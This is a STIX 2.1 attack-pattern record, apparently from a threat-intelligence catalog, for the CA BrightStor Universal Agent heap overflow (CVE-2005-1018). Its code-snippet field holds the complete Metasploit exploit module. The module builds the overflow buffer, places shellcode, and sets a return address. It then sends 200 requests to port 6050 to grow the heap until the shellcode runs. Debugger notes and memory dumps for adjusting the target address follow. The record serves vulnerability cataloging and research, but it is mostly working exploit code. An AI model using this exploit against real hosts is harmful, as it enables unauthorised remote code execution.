{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f9a9a04-2c21-4fd0-b70a-882cafde00a6",
    "created": "2024-08-14T16:48:21.997772Z",
    "modified": "2024-08-14T16:48:21.997776Z",
    "name": "CA BrightStor Universal Agent Overflow",
    "description": " This module exploits a convoluted heap overflow in the CA BrightStor Universal Agent service. Triple userland exception results in heap growth and execution of dereferenced function pointer at a specified address. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/universal_agent.rb",
            "external_id": "universal_agent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1018"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor Universal Agent Overflow',\n      'Description'    => %q{\n          This module exploits a convoluted heap overflow in the CA\n        BrightStor Universal Agent service. Triple userland\n        exception results in heap growth and execution of\n        dereferenced function pointer at a specified address.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-1018'],\n          [ 'OSVDB', '15471' ],\n          [ 'BID', '13102'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # 250 bytes of space (bytes 0xa5 -> 0xa8 = reversed)\n          'Space'    => 164,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Magic Heap Target #1',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x01625c44, # We grow to our own return address\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-04-11',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6050)\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Trying target #{target.name}...\")\n\n    # The server reverses four bytes starting at offset 0xa5 :0\n\n    # Create the overflow string\n    boom = 'X' * 1024\n\n    # Required field to trigger the fault\n    boom[248, 2] = [1000].pack('V')\n\n    # The shellcode, limited to 250 bytes (no nulls)\n    boom[256, payload.encoded.length] = payload.encoded\n\n    # This should point to itself\n    boom[576, 4] = [target.ret].pack('V')\n\n    # This points to the code below\n    boom[580, 4] = [target.ret + 8].pack('V')\n\n    # We have 95 bytes, use it to hop back to shellcode\n    boom[584, 6] = \"\\x68\" + [target.ret - 320].pack('V') + \"\\xc3\"\n\n    # Stick the protocol header in front of our request\n    req = \"\\x00\\x00\\x00\\x00\\x03\\x20\\xa8\\x02\" + boom\n\n    # We keep making new connections and triggering the fault until\n    # the heap is grown to encompass our known return address. Once\n    # this address has been allocated and filled, each subsequent\n    # request will result in our shellcode being executed.\n\n    1.upto(200) {|i|\n      connect\n      print_status(\"Sending request #{i} of 200...\") if (i % 10) == 0\n      sock.put(req)\n      disconnect\n\n      # Give the process time to recover from each exception\n      select(nil,nil,nil,0.1);\n    }\n\n    handler\n  end\nend\n\n\n__END__\n012a0d91 8b8e445c0000     mov     ecx,[esi+0x5c44]\n012a0d97 83c404           add     esp,0x4\n012a0d9a 85c9             test    ecx,ecx\n012a0d9c 7407             jz      ntagent+0x20da5 (012a0da5)\n012a0d9e 8b11             mov     edx,[ecx]         ds:0023:41327441=???????\n012a0da0 6a01             push    0x1\n012a0da2 ff5204           call    dword ptr [edx+0x4]\n\nEach request will result in another chunk being allocated, the exception\ncauses these chunks to never be freed. The large chunk size allows us to\npredict the location of our buffer and grow our buffer to where we need it.\n\nIf these addresses do not match up, run this exploit, then attach with WinDbg:\n\n> s 0 Lfffffff 0x44 0x5c 0x61 0x01\n\nFigure out the pattern, replace the return address, restart the service,\nand run it through again. Only tested on WinXP SP1\n\n011b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n011c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n011d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n011e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n011f5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01205c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n[ snip ]\n01605c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01615c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01625c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01635c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01645c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01655c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01665c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01675c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01685c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01695c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n016a5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n016b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n016c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n016d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n01725c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n017e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\\b.L\\b.........\n",
    "x_mitre_disclosure_date": "2005-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}